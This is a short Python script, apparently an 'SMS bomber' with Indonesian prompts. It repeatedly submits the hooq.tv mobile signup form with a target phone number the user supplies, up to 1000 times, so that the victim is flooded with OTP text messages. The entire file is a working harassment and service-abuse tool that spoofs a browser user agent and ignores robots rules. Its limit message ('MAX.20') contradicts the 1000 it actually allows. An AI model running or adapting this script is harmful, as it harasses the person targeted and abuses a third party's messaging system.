import os, hashlib, sys, time, threading, random, base64, urllib.request, requests

try:
    import mechanize
    os.system('clear')
    os.system('toilet -f mono12 -F border ZatYtm')
    print(' ')
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh((mechanize._http.HTTPRefreshProcessor()), max_time=1)
    br.addheaders = [('User-Agent', 'Mozilla/8.0 (Linux; U; Android 8.1)')]

    def send(no):
        br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
        br.select_form(nr=0)
        br.form['mobile'] = no
        br.form['password'] = 'Zaty'
        res = br.submit().read()
        if 'confirmotp' in str(res):
            print(i + 1, 'Sukses Mengirim')
        else:
            print(i + 1, 'Gagal Mengirim')


    no = int(input('[?] Nomor Target(08xx): '))
    jlm = int(input('[?] Jumlah(max.1000): '))
    print()
    if jlm > 1000:
        exit('[!] MAX.20 BRAYY, KALAU KEBANYAKAN KOID')
    for i in range(jlm):
        send(str(no))
        time.sleep(1)

except KeyboardInterrupt:
    exit('[EXIT] CTRL + C Detected')
except Exception as F:
    try:
        print('Err: %s' % F)
    finally:
        F = None
        del F
